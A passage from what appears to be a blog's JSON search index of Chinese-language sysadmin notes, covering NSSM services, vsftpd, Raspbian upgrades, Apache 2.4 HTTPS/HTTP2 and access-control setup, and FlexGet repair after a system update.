id=\"刪除服務\"><a href=\"#刪除服務\" class=\"headerlink\" title=\"刪除服務\"></a>刪除服務</h2><figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ nssm remove <span class=\"string\">\"服務名稱\"</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"設定服務-中英文參照\"><a href=\"#設定服務-中英文參照\" class=\"headerlink\" title=\"設定服務(中英文參照)\"></a>設定服務(中英文參照)</h2><table>\n<thead>\n<tr>\n<th>頁籤</th>\n<th>參數</th>\n<th>說明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Application</td>\n<td>Path</td>\n<td>執行應用程式的路徑和名稱。</td>\n</tr>\n<tr>\n<td>Application</td>\n<td>Startup Directory</td>\n<td>啟動資料夾。</td>\n</tr>\n<tr>\n<td>Application</td>\n<td>Arguments</td>\n<td>應用程式參數。</td>\n</tr>\n<tr>\n<td>I/O</td>\n<td>Output (stdout)</td>\n<td>結果輸出檔案。</td>\n</tr>\n<tr>\n<td>I/O</td>\n<td>Error (stderr)</td>\n<td>錯誤輸出檔案。</td>\n</tr>\n</tbody>\n</table>\n<p>中間，有試著測試假如我撞到port，起動NSSM建立好的Server會如何??<br>什麼?竟然還繼續Work!!!後來發現原來是NSSM會執行執行程式<br>所以我關掉chat Server竟然還可以跑<br>NSSM設定還可以設定很多東西</p>\n<h1 id=\"參考來源：\"><a href=\"#參考來源：\" class=\"headerlink\" title=\"參考來源：\"></a>參考來源：</h1><ul>\n<li><a href=\"https://nssm.cc/\" target=\"_blank\" rel=\"noopener\">NSSM - the Non-Sucking Service Manager</a></li>\n<li><a href=\"http://blog.developer.idv.tw/2016/08/nginx-run-as-windows-service.html\" target=\"_blank\" rel=\"noopener\">Xian’s 學習筆記: Nginx run as windows service</a></li>\n<li><a href=\"http://leoyeh.me:8080/2017/07/26/%E8%A7%A3%E6%B1%BA%E5%95%8F%E9%A1%8C-Windows-Service-1/\" target=\"_blank\" rel=\"noopener\">解決問題 Windows Service (1) | Leo Yeh’s Blog</a></li>\n<li>[透過NSSM建立Windows Services | RiCo技術農場 - 點部落](https:/</li>\n</ul>\n","categories":["實用工具"],"tags":["Window Service","NSSM"]},{"title":"更新系統vsftpd壞掉事情","url":"/blog/2018/01/07/logdown/2018-01-07-4726190/","content":"<p>上篇更新系統完<br>我遇到vsftpd沒辦法啟動<br>簡單記錄採雷筆記<br><a id=\"more\"></a></p>\n<p>由於怕新版設定檔不太一樣<br>所以我就沒有保留舊的設定檔(當然我有先抓下來預備)</p>\n<p>其怪怎麼無法啟動vsftpd</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">pi@raspberrypi  $ sudo dpkg --configure  vsftpd</span><br><span class=\"line\">設定 vsftpd (3.0.2-17+deb8u1) ...</span><br><span class=\"line\">vsftpd user (ftp) already exists, doing nothing.</span><br><span class=\"line\"></span><br><span class=\"line\">vsftpd directory (/srv/ftp) already exists, doing nothing.</span><br><span class=\"line\">insserv: warning: script <span class=\"string\">'K02noip2'</span> missing LSB tags and overrides</span><br><span class=\"line\">insserv: warning: script <span class=\"string\">'noip2'</span> missing LSB tags and overrides</span><br><span class=\"line\">[warn] Starting FTP server: vsftpd[....] vsftpd failed - probably invalid config. ... (warning).</span><br><span class=\"line\">invoke-rc.d: initscript vsftpd, action <span class=\"string\">\"start\"</span> failed.</span><br><span class=\"line\">dpkg: error processing package vsftpd (--configure):</span><br><span class=\"line\"> 子程序 已安裝的 post-installation script 傳回了錯誤退出狀態 1</span><br><span class=\"line\">處理時發生錯誤：</span><br><span class=\"line\"> vsftpd</span><br></pre></td></tr></table></figure>\n<p> 後來發現，/etc/init.d/vsftpd裡面腳本執行有問題<br> 我試著執行<code>sudo vsftpd</code></p>\n <figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"> pi@raspberrypi /etc/apache2/sites-enabled $ sudo vsftpd</span><br><span class=\"line\">500 OOPS: socket</span><br></pre></td></tr></table></figure>\n<p>Google一下，發現沒有幾個人遇到這個問題</p>\n<p>後來把/etc/vsftpd<br>設定改<br><code>listen=YES</code></p>\n<p>之後又遇到<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">pi@raspberrypi $ sudo vsftpd</span><br><span class=\"line\">500 OOPS: run two copies of vsftpd for IPv4 and IPv6</span><br></pre></td></tr></table></figure></p>\n<p>把/etc/vsftpd<br><code>#listen_ipv6=YES</code>或改成<code>listen_ipv6=NO</code><br>就能正常運行</p>\n","categories":["vsftpd"],"tags":["vsftpd"]},{"title":"elementary OS 裝機小體驗","url":"/blog/2018/01/04/logdown/2018-01-04-4718279/","content":"<p>長期有一台筆電都是用Ezgo，最近看到有人寫 <a href=\"https://medium.com/@shengyou/2018ironman-eos-for-php-developer-day1-f9eaeff8e554\" target=\"_blank\" rel=\"noopener\">[2018 鐵人賽] 簡潔高效的 PHP &amp; Laravel 工作術：從 elementary OS 下手的聰明改造提案 #1</a><br>就試著裝裝看XD，沒想到比我裝的Ezgo非常順<br>操作介面有點像mac<br>就簡單做一下記錄</p>\n<a id=\"more\"></a>\n<p>輸入法這個照做就可以完成<br><a href=\"https://medium.com/@shengyou/2018ironman-eos-for-php-developer-day10-1a15f454d7c6\" target=\"_blank\" rel=\"noopener\">[2018 鐵人賽] 簡潔高效的 PHP &amp; Laravel 工作術：從 elementary OS 下手的聰明改造提案 #10</a></p>\n<p>其中我還遇到很奇怪的事<br>目前懷疑是appcenter壞掉<br>導至我系統壞掉…重開機也不能登入(就是  登入一定去就馬上登出，登入畫面也沒圖片)<br>目前有<a href=\"https://elementaryos.stackexchange.com/questions/11454/app-center-stuck-on-waiting\" target=\"_blank\" rel=\"noopener\">applications - App Center stuck on ‘waiting’ - elementary OS Stack Exchange</a><br>在tty1下這個<code>dpkg --configure -a</code>指令就可以正常進去了</p>\n<p>原本在樹莓派使用TightVNC<br>在elementary OS進然一進去沒有畫面<br>在粉絲團詢問到好用的遠端<br>有人推AnyDesk<br>真的很好用，還有cli指令<br><a href=\"http://support.anydesk.com/knowledgebase/articles/441867-command-line-interface\" target=\"_blank\" rel=\"noopener\">Command Line Interface – Customer Feedback for AnyDesk</a></p>\n<p>開機登入自動啟動<code>anydesk --start-service</code></p>\n<p><a href=\"https://medium.com/@shengyou/2018ironman-eos-for-php-developer-day1-f9eaeff8e554\" target=\"_blank\" rel=\"noopener\">[2018 鐵人賽] 簡潔高效的 PHP &amp; Laravel 工作術：從 elementary OS 下手的聰明改造提案 #1</a><br><a href=\"https://elementaryos.stackexchange.com/questions/11454/app-center-stuck-on-waiting\" target=\"_blank\" rel=\"noopener\">applications - App Center stuck on ‘waiting’ - elementary OS Stack Exchange</a><br><a href=\"https://www.jianshu.com/p/1e104090ffaa\" target=\"_blank\" rel=\"noopener\">elementary OS 0.4 Loki安装后的配置 - 简书</a></p>\n"},{"title":"Raspberry pi 從0開始遇到問題(無法登入ssh)  & 更新Jessie升級","url":"/blog/2018/01/06/logdown/2018-01-06-raspberry-pi-encountered-problems-starting-from-0-unable-to-log-in-ssh/","content":"<p>最近好想把Apache升級到2.4，這樣我就能使用http2<br>不過因為樹莓派一直卡在Wheezy<br>原本想說原升怎麼沒到2.4<br>後來發現Jessie才能升…<br>想說怎麼都沒有更新<br>現在版本是Stretch</p>\n<a id=\"more\"></a>\n<p>好想升Apache 2.4阿<br><img src=\"https://i.imgur.com/88ccSit.gif\" alt=\"\"></p>\n<p>最先有試著用<a href=\"http://yehnan.blogspot.com/2014/09/raspberry-piraspbian.html\" target=\"_blank\" rel=\"noopener\">葉難: Raspberry Pi：如何更新Raspbian</a><br><code>rpi-upgrade</code>更新上去，但是沒有更新最高</p>\n<p><a href=\"http://blog.dreambreakerx.com/2015/10/upgrade-raspbian-from-wheezy-to-jessie/\" target=\"_blank\" rel=\"noopener\">Raspbian 從 7 Wheezy 升級到 8 Jessie - 亂碼中的煉金術</a></p>\n<blockquote>\n<p>   修改檔案 /etc/apt/sources.list 把第一行所有的 “wheezy” 置換為 “jessie” ，修改後大概是這樣 “deb <a href=\"http://mirrordirector.raspbian.org/raspbian/\" target=\"_blank\" rel=\"noopener\">http://mirrordirector.raspbian.org/raspbian/</a> jessie main contrib non-free rpi”<br> 修改檔案 /etc/apt/sources.list.d/raspi.list 把第一行所有的 “wheezy” 置換為 “jessie”，第一行最後加上 “ ui” ，修改後大概是這樣 “deb <a href=\"http://archive.raspberrypi.org/debian\" target=\"_blank\" rel=\"noopener\">http://archive.raspberrypi.org/debian</a> jessie main ui”<br>    建立資料夾 /home/pi/.config/autostart ， “mkdir /home/pi/.config/autostart” (注意 config 前面有 “.” )<br>    更新軟體套件庫 “sudo apt-get update”<br>    升級系統及軟體 “sudo apt-get -y dist-upgrade” (這過程大概兩小時， “-y” 是不詢問直接安裝)</p>\n</blockquote>\n<p>改socues.list可以試試<code>sudo sed -i &#39;s/wheezy/jessie/g&#39; /etc/apt/sources.list</code><br>改完執行下面，就更新完成<br><figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo apt-get update</span><br><span class=\"line\">sudo apt-get -y dist-upgrade</span><br></pre></td></tr></table></figure></p>\n<p>更新前最好備份SD會比較好<br>我有apache2跟vsftpd有壞掉<br>下面幾篇會補一下我遇到的問題</p>\n<p>更新期間還會問要不要保留設定檔<br>通常我都會選D ，看有異動什麼檔案<br>假如沒有問題，就直接更換</p>\n<p>中間我原本想wheezy直接升到Stretch<br>所以直接把wheezy改成stretch<br>但好像升級有問題，可能不執直接跳兩階XD<br>網路上有些人說用<code>rpi-upgrade</code>，有些說不要用<code>rpi-rpgrade</code><br>但後面都有用<code>apt-get update  &amp; apt-get - y dist-upgrade</code></p>\n<h2 id=\"最新燒入新版img預設沒有開啟ssh\"><a href=\"#最新燒入新版img預設沒有開啟ssh\" class=\"headerlink\" title=\"最新燒入新版img預設沒有開啟ssh\"></a>最新燒入新版img預設沒有開啟ssh</h2><blockquote>\n<p>開啟SSH功能<br>2016-11-25:</p>\n<ul>\n<li>SSH disabled by default; can be enabled by creating a file with name “ssh” in boot partition<br>意思應該是說創建一個名叫”ssh”的文件在boot分區,應該就是內存卡的根目錄。</li>\n</ul>\n</blockquote>\n<p>在/boot目錄  <code>touch ssh</code><br>開機才會啟動ssh<br>重新燒img想說怎麼連不到XD<br>原來新版有改</p>\n<p>#swap 更新完吃2G<br><code>/etc/dphys-swapfile</code>設定<code>CONF_SWAPSIZE=100</code><br>存檔之後<code>service dphys-swapfile start</code>就正常了<br><a href=\"https://blog.gtwang.org/iot/raspberry-pi/raspberry-pi-swap-configuration-using-usb-stick/\" target=\"_blank\" rel=\"noopener\">https://blog.gtwang.org/iot/raspberry-pi/raspberry-pi-swap-configuration-using-usb-stick/</a></p>\n<h2 id=\"參考來源\"><a href=\"#參考來源\" class=\"headerlink\" title=\"參考來源\"></a>參考來源</h2><p><a href=\"http://blog.sina.com.cn/s/blog_6c9c71840102woam.html\" target=\"_blank\" rel=\"noopener\">raspbian 系统配置中遇到的坑 NOOBS_v2_4_0_MozartC_新浪博客</a><br><a href=\"http://blog.itist.tw/2017/03/headless-wifi-setup-without-monitor-keyboard-or-cables-for-raspberry-pi-zero-w-and-3-model-b.html\" target=\"_blank\" rel=\"noopener\">Raspberry Pi 的基礎 - 沒螢幕、沒鍵盤、沒網路，居然也能設定 Wi-FI 連線 | IT 技術家</a><br><a href=\"https://www.digitalocean.com/community/questions/enable-http2-in-apache-on-ubuntu-16-04\" target=\"_blank\" rel=\"noopener\">Enable HTTP2 in Apache on Ubuntu 16.04 | DigitalOcean</a><br><a href=\"https://lcarbon.idv.tw/%E7%B6%B2%E7%AB%99-%E7%B6%B2%E5%9F%9F%E6%90%AC%E6%96%B0%E5%AE%B6%E3%80%81%E5%8D%87%E7%B4%9A-https-%E8%88%87-http2%EF%BC%88%E9%95%B7%E7%AF%87%E5%A4%A7%E8%AB%96%E7%89%88%EF%BC%89/\" target=\"_blank\" rel=\"noopener\">[網站] 網域搬新家、升級 HTTPS 與 HTTP/2（長篇大論版） – Digiologist</a><br><a href=\"http://blog.itist.tw/2017/03/headless-wifi-setup-without-monitor-keyboard-or-cables-for-raspberry-pi-zero-w-and-3-model-b.html\" target=\"_blank\" rel=\"noopener\">Raspberry Pi 的基礎 - 沒螢幕、沒鍵盤、沒網路，居然也能設定 Wi-FI 連線 | IT 技術家</a><br><a href=\"http://www.mobibrw.com/2017/9851?utm_source=tuicool&amp;utm_medium=referral\" target=\"_blank\" rel=\"noopener\">树莓派系统升级Raspbian Wheezy到Raspbian Jessie(树莓派2B+） – 默默的点滴</a></p>\n","categories":["Linux"],"tags":["Raspberry Pi"]},{"title":"更新系統apache壞掉，從零開始設定","url":"/blog/2018/01/07/logdown/2018-01-07-4726228/","content":"<p>由於更新系統<br>apache也更著升到2.4<br>查一些資料，有些升級設定檔不太一樣<br>所以我沒有選擇保留設定檔</p>\n<a id=\"more\"></a>\n<p>#設定htaccess</p>\n<p>首先，我發現我的htaccess沒有生效<br>太久設定的東西，大概忘了一半XD<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;Directory &quot;/var/www&quot;&gt;</span><br><span class=\"line\">AllowOverride All</span><br><span class=\"line\">&lt;/Directory&gt;</span><br></pre></td></tr></table></figure></p>\n<p>這個設定完還不夠安全<br><a href=\"http://xxxxx.com/.htaccess可以看到裡面資訊\" target=\"_blank\" rel=\"noopener\">http://xxxxx.com/.htaccess可以看到裡面資訊</a></p>\n<p>我還發現我有設定<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;Files ~ &quot;^\\.ht&quot;&gt;</span><br><span class=\"line\">    Order allow,deny</span><br><span class=\"line\">    Deny from all</span><br><span class=\"line\">    Satisfy all</span><br><span class=\"line\">    EnableSendfile Off</span><br><span class=\"line\">&lt;/Files&gt;</span><br><span class=\"line\">&lt;Files ~ &quot;.part$&quot;&gt;</span><br><span class=\"line\">order allow,deny</span><br><span class=\"line\">deny from all</span><br><span class=\"line\">&lt;/Files&gt;</span><br></pre></td></tr></table></figure></p>\n<p>更換成<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;Files ~ &quot;^\\.ht&quot;&gt;</span><br><span class=\"line\">    Require all denied</span><br><span class=\"line\">    Satisfy all</span><br><span class=\"line\">    EnableSendfile Off</span><br><span class=\"line\">&lt;/Files&gt;</span><br><span class=\"line\">&lt;Files ~ &quot;.part$&quot;&gt;</span><br><span class=\"line\">    Require all denied</span><br><span class=\"line\">&lt;/Files&gt;</span><br></pre></td></tr></table></figure></p>\n<p>想說我之前有寫過autoindex筆記<br>後來發現裡面沒有記很多東西<br>今天來補一補吧<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;Files ~ &quot;.part$&quot;&gt;</span><br><span class=\"line\">order allow,deny</span><br><span class=\"line\">deny from all</span><br><span class=\"line\">Satisfy All</span><br><span class=\"line\">&lt;/Files&gt;</span><br><span class=\"line\">Order deny,allow</span><br><span class=\"line\">Deny from all</span><br><span class=\"line\">AuthName &quot;Please type password&quot;</span><br><span class=\"line\">AuthType Basic</span><br><span class=\"line\">AuthUserFile &quot;----你看不到----/.htpasswd&quot;</span><br><span class=\"line\">require valid-user</span><br><span class=\"line\">IndexHeadInsert &quot;&lt;meta name=\\&quot;viewport\\&quot; content=\\&quot;width=device-width, initial-scale=1.0\\&quot;&gt;&lt;link rel=\\&quot;shortcut icon\\&quot; type=\\&quot;image/png\\&quot; href=\\&quot;/include/favicon.ico\\&quot;/&gt;&quot;</span><br><span class=\"line\">IndexStyleSheet &quot;/include/autoindex.css&quot;</span><br><span class=\"line\">Allow from 192.168.1.0/24</span><br><span class=\"line\">Satisfy Any</span><br></pre></td></tr></table></figure></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Usage:</span><br><span class=\"line\">    htpasswd [-cmdpsD] passwordfile username</span><br><span class=\"line\">    htpasswd -b[cmdpsD] passwordfile username password</span><br><span class=\"line\"></span><br><span class=\"line\">    htpasswd -n[mdps] username</span><br><span class=\"line\">    htpasswd -nb[mdps] username password</span><br><span class=\"line\"> -c  创建一个新的加密密码文件</span><br><span class=\"line\"> -n  不更新文件，显示结果</span><br><span class=\"line\"> -m  使用MD5加密密码</span><br><span class=\"line\"> -d  使用CRYPT加密密码（默认）</span><br><span class=\"line\"> -p  不加密密码</span><br><span class=\"line\"> -s  使用SHA加密密码</span><br><span class=\"line\"> -b  直接在命令行输入密码，而不是提示后再输入密码</span><br><span class=\"line\"> -D  删除用户</span><br><span class=\"line\">在Windows, NetWare与 TPF系统，&apos;-m&apos; 是默认的密码加密方式。</span><br><span class=\"line\">在所有其他系统，&apos;-p&apos;可能不能使用。</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">設定帳號密碼</span><br><span class=\"line\">htpasswd -c .htpasswd username</span><br></pre></td></tr></table></figure>\n<p><a href=\"http://blog.csdn.net/fdipzone/article/details/41020045\" target=\"_blank\" rel=\"noopener\">使用apache htpasswd生成加密的密码文件，并使用.htaccess控制目录访问 - 傲雪星枫 - CSDN博客</a></p>\n<p>我真的忘記^.ht是不是我設定的<br>裡面來有一些設定說明</p>\n<blockquote>\n<p>之前在 VirtualBox 的 Shared Folder 進行開發，在寫 PHP 的時候都沒問題， 但是只要碰到靜態檔案，例如 Js 檔，明明修改了，看到的還是舊的版本。<br>這時候只要重開 Apache 就好了，但是每次這樣重開也不是辦法，於是 Google 一下是哪裡出了問題。 發現是 Apache 的 sendfile 在做怪，這是一個利用 Kernel 的 sendfile 來加速靜態檔案發送的功能。</p>\n</blockquote>\n<p><a href=\"http://blog.roachking.net/blog/2013/01/26/virtualbox-sendfile/\" target=\"_blank\" rel=\"noopener\">VirtualBox Apache Sendfile - 蟑螂窩</a></p>\n<blockquote>\n<p>最早接觸Satisfy，是這樣一個情況，一個目錄啟用了密碼保護，想單獨開放它的一個子目錄，讓這個子目錄無須密碼即可訪問</p>\n</blockquote>\n<p><a href=\"http://www.fwolf.com/blog/post/341\" target=\"_blank\" rel=\"noopener\">Apache的Satisfy详解 – Fwolf’s Blog</a></p>\n<h2 id=\"更多參考：\"><a href=\"#更多參考：\" class=\"headerlink\" title=\"更多參考：\"></a>更多參考：</h2><p><a href=\"http://cn.linux.vbird.org/linux_server/0360apache_3.php\" target=\"_blank\" rel=\"noopener\">鳥哥的 Linux 私房菜 – WWW 伺服器 Apache</a><br><a href=\"https://dywang.csie.cyut.edu.tw/dywang/rhel7/node41.html\" target=\"_blank\" rel=\"noopener\">存取限制</a></p>\n<p>#設定https<br>由於之前用certbot設定過了<br>只要加設定就可以了</p>\n<p>###舊設定<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">ServerAdmin service@&lt;&lt;不讓你看&gt;&gt;</span><br><span class=\"line\">DocumentRoot /var/www/</span><br><span class=\"line\">ServerName &lt;&lt;不讓你看&gt;&gt;</span><br><span class=\"line\">ServerAlias &lt;&lt;不讓你看&gt;&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">SSLEngine On</span><br><span class=\"line\">SSLCertificateFile /etc/letsencrypt/live/&lt;&lt;不讓你看&gt;&gt;/cert.pem</span><br><span class=\"line\">SSLCertificateKeyFile /etc/letsencrypt/live/&lt;&lt;不讓你看&gt;&gt;/privkey.pem</span><br><span class=\"line\">SSLCertificateChainFile /etc/letsencrypt/live/&lt;&lt;不讓你看&gt;&gt;/chain.pem</span><br><span class=\"line\">SSLCACertificateFile /etc/letsencrypt/live/&lt;&lt;不讓你看&gt;&gt;/fullchain.pem</span><br></pre></td></tr></table></figure></p>\n<p> 發現好像可以不用設定上面一些Name<br> 直接照上面網址設定</p>\n<h3 id=\"新設定\"><a href=\"#新設定\" class=\"headerlink\" title=\"新設定\"></a>新設定</h3><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"> SSLEngine On</span><br><span class=\"line\">SSLCertificateFile /etc/letsencrypt/live/&lt;&lt;不讓你看&gt;&gt;/cert.pem</span><br><span class=\"line\">SSLCertificateKeyFile /etc/letsencrypt/live/&lt;&lt;不讓你看&gt;&gt;/privkey.pem</span><br><span class=\"line\">SSLCertificateChainFile /etc/letsencrypt/live/&lt;&lt;不讓你看&gt;&gt;/chain.pem</span><br><span class=\"line\">SSLCACertificateFile /etc/letsencrypt/live/&lt;&lt;不讓你看&gt;&gt;/fullchain.pem</span><br></pre></td></tr></table></figure>\n<p>#設定http2<br>然後參照<a href=\"https://lcarbon.idv.tw/%E7%B6%B2%E7%AB%99-%E7%B6%B2%E5%9F%9F%E6%90%AC%E6%96%B0%E5%AE%B6%E3%80%81%E5%8D%87%E7%B4%9A-https-%E8%88%87-http2%EF%BC%88%E9%95%B7%E7%AF%87%E5%A4%A7%E8%AB%96%E7%89%88%EF%BC%89/\" target=\"_blank\" rel=\"noopener\">[網站] 網域搬新家、升級 HTTPS 與 HTTP/2（長篇大論版） – Digiologist</a>設定https<br>發生悲劇<br>怎麼會沒有http2 mod<br>後來發現要apache2.4.7才有，apache 2.4.1沒有<br>系統繼續升級到stretch，就能更新到2.4.7<br>照上面執行就能順利完成</p>\n<p>簡單記錄設定<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ sudo a2enmod http2</span><br><span class=\"line\">$ sudo service  apache2 restart</span><br></pre></td></tr></table></figure></p>\n<p> 在<code>/etc/apache2/sites-enabled/000-default.conf</code> 裡VirtualHost加入：<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Protocols h2 http/1.1</span><br></pre></td></tr></table></figure></p>\n<p> 在<code>/etc/apache2/sites-enabled/default-ssl.conf</code> 裡VirtualHost加入：<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Protocols h2 h2c http/1.1</span><br></pre></td></tr></table></figure></p>\n<p>重啟apache就能正常，可以瀏覽器開放著工具是不是http2<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ sudo service apache2 reload</span><br></pre></td></tr></table></figure></p>\n<p>剩下就是http導https頁面<br>今天剛好看到<a href=\"https://jerrylin.blog/code-1-b222579a988\" target=\"_blank\" rel=\"noopener\">用.htaccess自動導向https – I’m a Taiwan based UIUX designer.</a><br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">RewriteEngine On</span><br><span class=\"line\">// 開啟rewrite這個功能模組</span><br><span class=\"line\"></span><br><span class=\"line\">RewriteCond %&#123;SERVER_PORT&#125; 80</span><br><span class=\"line\">// RewriteCond：rewrite condition 重寫條件，</span><br><span class=\"line\">// %則是變數的意思，也就是&#123;SERVER_PORT&#125; 80是重寫的條件(變數)。</span><br><span class=\"line\">// 整句意思是：所有由port 80的連線為…(接續下行)</span><br><span class=\"line\"></span><br><span class=\"line\">RewriteRule ^(.*)$ https://%&#123;HTTP_HOST&#125;%&#123;REQUEST_URI&#125; [L,R=301]</span><br><span class=\"line\">// RewriteRule：重寫規則為…，</span><br><span class=\"line\">// ^(.*)$：任意字元，</span><br><span class=\"line\">// %&#123;HTTP_HOST&#125;%&#123;REQUEST_URI&#125;：訪問的主域名與相對位址，</span><br><span class=\"line\">// [L,R=301]：L為last，最後一條規則，</span><br><span class=\"line\">// R=301則是http協議中的狀態碼，意為永久改變位置。</span><br><span class=\"line\">// 整句意思是：永久重寫所有連線為https的網址</span><br></pre></td></tr></table></figure></p>\n<p><a href=\"http://xdeath.dyndns.pro/read.php?52\" target=\"_blank\" rel=\"noopener\">htaccess 常用命令 - 小小工程師的日常筆記 -</a></p>\n<p>因為我還有特殊需<br>還需要設定autoindex照日期排序<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;IfModule mod_autoindex.c&gt;</span><br><span class=\"line\">...</span><br><span class=\"line\">IndexOrderDefault Descending Date</span><br><span class=\"line\">...</span><br><span class=\"line\">&lt;/IfModule&gt;</span><br></pre></td></tr></table></figure></p>\n<p>這次經驗覺得設定檔還是要寫一下注解<br>不然放置很久，都不知道是不是自己加的XD</p>\n<p><a href=\"http://leoyeh.me:8080/2017/08/12/%E8%A7%A3%E6%B1%BA%E5%95%8F%E9%A1%8C-SSL-TLS-2/\" target=\"_blank\" rel=\"noopener\">解決問題 SSL/TLS (2) | Leo Yeh’s Blog</a><br><a href=\"http://blog.csdn.net/hfahe/article/details/5490223\" target=\"_blank\" rel=\"noopener\">使用a2ensite和a2dissite来快速切换站点 - CSDN博客</a><br><a href=\"http://what-a-good-day.blogspot.com/2008/02/apache-htaccess.html\" target=\"_blank\" rel=\"noopener\">風和日麗 天氣晴: Apache 的 .htaccess 失效？</a><br><a href=\"http://xdeath.dyndns.pro/read.php?52\" target=\"_blank\" rel=\"noopener\">htaccess 常用命令 - 小小工程師的日常筆記 -</a></p>\n","categories":["Apache"],"tags":["Linux","apache"]},{"title":"更新系統flexget壞掉啦!!","url":"/blog/2018/01/07/logdown/2018-01-07-4726929/","content":"<p>想說flexget應該正常<br>結果執行flexget -v<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">找不到/bin/xxx/python2.6</span><br></pre></td></tr></table></figure></p>\n<a id=\"more\"></a>\n<p>升級OS後python是2.7<br>想說直接升級flexget<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo pip install --upgrade setuptools</span><br><span class=\"line\">sudo pip install --upgrade flexget</span><br></pre></td></tr></table></figure></p>\n<p><a href=\"https://flexget.com/Upgrade\" target=\"_blank\" rel=\"noopener\">FlexGet官方升級說明</a></p>\n<p>但是不成功…</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo pip install --upgrade --force-reinstall flexget</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://stackoverflow.com/questions/19548957/can-i-force-pip-to-reinstall-the-current-version\" target=\"_blank\" rel=\"noopener\">python - Can I force pip to reinstall the current version? - Stack Overflow</a></p>\n<p>還是安裝失敗 囧</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo pip3 install --upgrade --force-reinstall flexget</span><br></pre></td></tr></table></figure>\n<p>pip3就可以了… 不知道為什麼<br><code>.flexget/db-config.sqlit</code>要刪掉</p>\n<p>執行<code>flexget --test execute</code>怎麼跑出錯誤<code>Transmissionrpc module version 0.11 or higher required</code><br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo pip3 install  transmissionrpc</span><br></pre></td></tr></table></figure></p>\n<p><code>flexget --test execute</code>跑出<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">2018-01-07 22:07 VERBOSE  manager                       Creating new database /home/pi/.flexget/test-config.sqlite - DO NOT INTERUPT ...</span><br><span class=\"line\">2018-01-07 22:08 CRITICAL manager                       [/templates/autoPass] The key `disable_builtins` is not valid here. Only known plugin names are valid keys.</span><br><span class=\"line\">2018-01-07 22:08 CRITICAL manager                       [/templates/olddownload] The key `disable_builtins` is not valid here. Only known plugin names are valid keys.</span><br><span class=\"line\">2018-01-07 22:08 CRITICAL manager                       [/templates/default] The key `disable_builtins` is not valid here. Only known plugin names are valid keys.</span><br><span class=\"line\">2018-01-07 22:08 CRITICAL manager</span><br></pre></td></tr></table></figure></p>\n<p>是<code>config.yml</code>裡設定disable_buildin關係<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">disable_builtins: [seen_info_hash]</span><br></pre></td></tr></table></figure></p>\n<p>先暫時移除<br>改寫法可能是下面這段<br><a href=\"https://flexget.com/Plugins/disable\" target=\"_blank\" rel=\"noopener\">https://flexget.com/Plugins/disable</a></p>\n<p>先分享我的config.yml<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">templates:</span><br><span class=\"line\">  default:</span><br><span class=\"line\">    transmission:</span><br><span class=\"line\">      host: localhost</span><br><span class=\"line\">      port: 9091</span><br><span class=\"line\">      username: username</span><br><span class=\"line\">      password: usernamepassword</span><br><span class=\"line\">      addpaused: no</span><br><span class=\"line\">      path: /mnt/extHDD/Download/Mikata/201710/&#123;&#123;task&#125;&#125;</span><br><span class=\"line\">    free_space:</span><br><span class=\"line\">      path: /mnt/extHDD/</span><br><span class=\"line\">      space: 1000</span><br><span class=\"line\">    clean_transmission:</span><br><span class=\"line\">      host: localhost</span><br><span class=\"line\">      port: 9091</span><br><span class=\"line\">      username: username</span><br><span class=\"line\">      password: usernamepassword</span><br><span class=\"line\">      finished_for: 4 days</span><br><span class=\"line\">      min_ratio: 1</span><br><span class=\"line\">    if:</span><br><span class=\"line\">      - &quot;&apos;季度全集&apos; in category&quot;: reject</span><br><span class=\"line\">  olddownload:</span><br><span class=\"line\">    transmission:</span><br><span class=\"line\">      host: localhost</span><br><span class=\"line\">      port: 9091</span><br><span class=\"line\">      username: username</span><br><span class=\"line\">      password: usernamepassword</span><br><span class=\"line\">      addpaused: no</span><br><span class=\"line\">      path: /mnt/extHDD/Download/Mikata/201707/&#123;&#123;task&#125;&#125;</span><br><span class=\"line\">    free_space:</span><br><span class=\"line\">      path: /mnt/extHDD/</span><br><span class=\"line\">      space: 1000</span><br><span class=\"line\">    clean_transmission:</span><br><span class=\"line\">      host: localhost</span><br><span class=\"line\">      port: 9091</span><br><span class=\"line\">      username: username</span><br><span class=\"line\">      password: usernamepassword</span><br><span class=\"line\">      finished_for: 4 days</span><br><span class=\"line\">      min_ratio: 1</span><br><span class=\"line\">    if:</span><br><span class=\"line\">      - 